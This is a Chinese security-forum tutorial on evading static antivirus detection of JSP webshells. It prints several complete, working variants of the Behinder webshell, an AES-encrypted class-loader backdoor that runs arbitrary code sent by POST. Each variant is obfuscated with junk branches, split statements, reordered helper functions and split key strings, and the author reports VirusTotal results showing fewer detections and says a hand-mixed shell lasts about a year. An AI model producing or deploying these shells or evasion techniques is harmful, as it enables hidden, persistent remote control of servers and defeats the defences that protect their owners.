# webshell静态免杀的一些思路

> **来源**: https://forum.butian.net/share/2484  
> **文章ID**: 2484

---

1.静态查杀绕过原理
----------

顾名思义静态查杀就是杀软会检查webshell文件的内容，提取的文件特征将与已知的恶意模式进行比对。这些恶意模式可以是已知的病毒特征、恶意软件代码片段等。比如正则表达式检测是否有危险函数这种。绕过的原理也很简单，就是让杀软的规则无法匹配到恶意代码。

2.添加毫无意义的代码
-----------

填充毫无意义的代码目的是在不改变代码本身功能的情况下修改代码的特征使得杀毒软件匹配特征规则失败。

现在用冰蝎的jsp马举个例子，默认的webshell上传vt可以看到。  
vt：<https://www.virustotal.com/gui/home/upload>

![图片.png](images/attach-77d16d2033bb58b557023115aa5bf8e06b876014.png)

然后冰蝎的jsp代码也比较简短。

![1697709623097.jpg](images/attach-e936e2150b746c300d07f06c226191f49214c573.jpg)

比如原本的代码

```java
String k = "xxxxxxxx";

// 可以修改成  因为
String k = "";
if (21174 < 18818181){
    k = "xxxxxx";
}

// 或者在前面添加毫无意义的代码
float f = 314141.14f;
if (1231241 > 12312){
    f += 12314.11f;
}
String k = "xxxxxxxx";

```

加了一堆代码后的shell：

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    class U extends ClassLoader {
        String AA = "AAAAAAA";
        String BB = "BBBBBBB";
        String CC = "CCCCCCC";
        U(ClassLoader c) {
            super(c);
            if (1929341894> 12313){
                boolean b = 18288 % 10 == 2;
            }
        }
        public Class g(byte[] b) {
            if (2 > 100){
                String aa = "AAAAAAA";
                int s = 1929341894 - 12313;
                aa = aa + s;
            }else {
                String cc = "ccccccc";
            }
            return super.defineClass(b, 0, b.length);
        }
    }
%><%
    if (request.getMethod().equals("POST")) {
        String k = "";
        if (1721747 < 17177755){
            k = "e45e329feb5d925b";
        }
        int i = 0;
        do{
            session.putValue("u", k);
        }while (i < 0);
        Cipher c = null;
        if (0 < 188819091){
            c = Cipher.getInstance("AES");
        }
        if (17471741 == 17471741){
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        }
        if (true){
            if ((74721741 >> 11) != 1 ){
                float f1 = 31.4145f;
            }
            new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);
        }
    }
%>
```

再次上传vt查看免杀效果，依旧还是有六个杀毒软件检测到恶意代码了。

![图片.png](images/attach-25e9faf99e7b0aefacc9cf7622f8d250811bf618.png)

其实是因为这段代码我们并没有拆开和默认密码的原因，现在可以拆开这段代码，然后依次添加无意义的代码。然后把默认密码也可以改一下。

```jsp
new U(this.getClass().getClassLoader()).g(c.doFinal(Base64.getDecoder().decode(request.getReader().readLine()))).newInstance().equals(pageContext);
```

修改完毕后的查杀效果：

![图片.png](images/attach-9e32680d1ae0373c18456277b9418b84e2363a13.png)

代码：

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%@ page import="java.io.BufferedReader" %>
<%!
    class U extends ClassLoader {
        String AA = "AAAAAAA";
        String BB = "BBBBBBB";
        String CC = "CCCCCCC";
        U(ClassLoader c) {
            super(c);
            if (1929341894> 12313){
                boolean b = 18288 % 10 == 2;
            }
        }
        public Class g(byte[] b) {
            if (2 > 100){
                String aa = "AAAAAAA";
                int s = 1929341894 - 12313;
                aa = aa + s;
            }else {
                String cc = "ccccccc";
            }
            return super.defineClass(b, 0, b.length);
        }
    }
%><%
    if (request.getMethod().equals("POST")) {
        String k = "";
        if (1721747 < 17177755){
            k = "e45e"+"329" +""+ "feb5"+"d925b";
        }
        int i = 0;
        do{
            session.putValue("u", k);
        }while (i < 0);
        Cipher c = null;
        if (0 < 188819091){
            c = Cipher.getInstance("AES");
        }
        if (17471741 == 17471741){
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        }
        if (true){
            if ((74721741 >> 11) != 1 ){
                float f1 = 31.4145f;
            }

            ClassLoader CL = this.getClass().getClassLoader();
            U u = new U(CL);
            if ((74721741 >> 11) != 1 ){
                float f1 = 31.4145f;
            }
            BufferedReader reader = request.getReader();
            if ((74721741 >> 11) != 1 ){
                float f1 = 31.4145f;
            }

            String readLine;
            if (2124124 < 1182){
                readLine = "pageContext";
            }else{
                readLine = reader.readLine();
            }
            byte[] decode = Base64.getDecoder().decode(readLine);

            if (2020101 == 2020101){
                byte[] bytes = c.doFinal(decode);
            }

            u.g(c.doFinal(decode)).newInstance().equals(pageContext);
        }
    }
%>
```

也能够正常连接

![图片.png](images/attach-f8e779c1e09ce0b8f65c4ef010983ca140606f4b.png)

其实上面的马以及能过掉大部分常见的杀毒软件了，下面是virscan的检测结果截图。

![图片.png](images/attach-eecd8e15cb7fa7821672ea8cebf1596b4132caf7.png)

方法也很简单，就是将代码拆分一下，然后添加各种无意义代码即可  
举例：

```jsp

// 假设这段代码能够被杀软规则匹配到
new U(this.getClass().getClassLoader());

// 那么就可以拆分成 
Classloader cl;
cl = this.getClass().getClassLoader();
U u;
u = new U(cl);

// 然后添加一些无意义代码
Classloader cl;
if (123141 != 0){
    // 这个条件必定会触发
    cl = this.getClass().getClassLoader();
}

if (12412 < 0){
    // 这个条件必定不会被触发 所以可以随便写一些代码
    cl = null;
    float f = 1243124.11f;
}

U u;
if (111111 == 0){
}else{
    u = new U(cl);
}

```

3.定义函数修改代码的顺序
-------------

修改的代码顺序主要是用来过一些较强的杀软，比如卡巴斯基这种。简单来说就是在不改变代码功能的情况下打乱代码的顺序使得检测规则无法匹配成功。  
还是举个例子：

```jsp
// 比如下面的代码能够被杀软的规则匹配到 
new U(this.getClass().getClassLoader());

// 可以通过定义函数的方式修改代码的顺序
<%
    new U(getClassLoader);
%>
<%!
    public ClassLoader getClassLoader(){
        return this.getClass().getClassLoader();
    }
%>
```

废话不多说了，直接上代码和免杀效果截图

```jsp
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %>
<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.security.InvalidKeyException" %>
<%!
    class UUAND extends ClassLoader {
        String AA = "AAAAAAA";
        String BB = "BBBBBBB";
        String CC = "CCCCCCC";
        UUAND(ClassLoader c) {
            super(c);
            if (1929341894> 12313){
                boolean b = 18288 % 10 == 2;
            }
        }
        public Class g(byte[] b) {
            if (2 > 100){
                String aa = "AAAAAAA";
                int s = 1929341894 - 12313;
                aa = aa + s;
            }else {
                String cc = "ccccccc";
            }
            return super.defineClass(b, 0, b.length);
        }

    }
%>

<%
    if (request.getMethod().equals("POST")) {
        String ACAW = "";
        if (1721747 < 17177755){
            ACAW = "e45e"+"329" +""+ "feb5"+"d925b";
        }
        int i = 0;
        do{
            session.putValue("u", ACAW);
        }while (i < 0);
        Cipher c = null;
        if (0 < 188819091){
            c = Cipher.getInstance("AES");
        }
        if (17471741 == 17471741){
            go(c, ACAW);
        }
        if (true){
            if ((74721741 >> 11) != 1 ){
                float f1 = 31.4145f;
            }

            ClassLoader CL = getClassLoader();
            UUAND u = new UUAND(CL);
            if ((74721741 >> 11) != 1 ){
                float f1 = 31.4145f;
            }
            BufferedReader reader = request.getReader();
            if ((74721741 >> 11) != 1 ){
                float f1 = 31.4145f;
            }

            String readLine;
            if (2124124 < 1182){
                readLine = "pageContext";
            }else{
                readLine = reader.readLine();
            }
            byte[] decode = getByte(readLine);
            byte[] bytes;
            if (2020101 == 2020101){
                bytes = c.doFinal(decode);
            }
            run(u, bytes).equals(pageContext);

        }
    }
%>
<%!
    public ClassLoader getClassLoader(){
        Object o = this;
        Class<?> aClass = o.getClass();
        ClassLoader classLoader = aClass.getClassLoader();
        return classLoader;
    }

    public byte[] getByte(String readline){
        return Base64.getDecoder().decode(readline);
    }

    public Object run(UUAND u, byte[] bytes){
        try {
            return u.g(bytes).newInstance();
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    public void go(Cipher c, String k){
        try {
            c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
        } catch (InvalidKeyException e) {
            e.printStackTrace();
        }
    }
%>
```

vt查杀结果：

![图片.png](images/attach-c9566f5baa8a9900c70f59abf410a40ba2b9eaa6.png)

这里注意的一点就是以下这段代码：

```jsp
public ClassLoader getClassLoader(){
    Object o = this;
    Class<?> aClass = o.getClass();
    ClassLoader classLoader = aClass.getClassLoader();
    return classLoader;
}

// 上面的代码其实就是下面这段 
this.getClass().getClassLoader();
```

跑起来也是没有问题的

![图片.png](images/attach-aeb1933d27375d68541edf1d591b93dbce014989.png)

4.总结
----

主要也就是在不改变代码功能的情况下改变代码的结构，其中可以用到各种方法。这里提到的一种方法就是使用函数改变代码在文件中的顺序以及添加一些毫无意义的代码。其实同理的方法还有很多，比如将数据绕一圈然后在绕回来。  
举例：

```jsp
// 比如杀以下代码
k = "e45e329feb5d925b";
// 就可以修改成 
k = "Ae45e329fA" + "Aeb5Ad925bAAAA";
K.replace("A", "");
```

也可以将代码拆分：

```jsp
// 比如杀以下代码
this.getClass().getClassLoader();

// 那么就可以修改成
Object o = this;
Class<?> aClass = o.getClass();
ClassLoader classLoader = aClass.getClassLoader();

// 中间加一些没用的代码就是 
Object o = this;
if(false){
    o = null;
}
Class<?> aClass = o.getClass();
if (aClass == null){
    aClass = null;
}
ClassLoader classLoader = aClass.getClassLoader();
```

ps:基本自己混一个马差不多能用个一年左右，hw还是挺多杀软的。  
什么？ 你不想自己写代码？  
吾有一计：

![图片.png](images/attach-76e82b80c2ff07a457d07a50684c9f99696296ed.png)
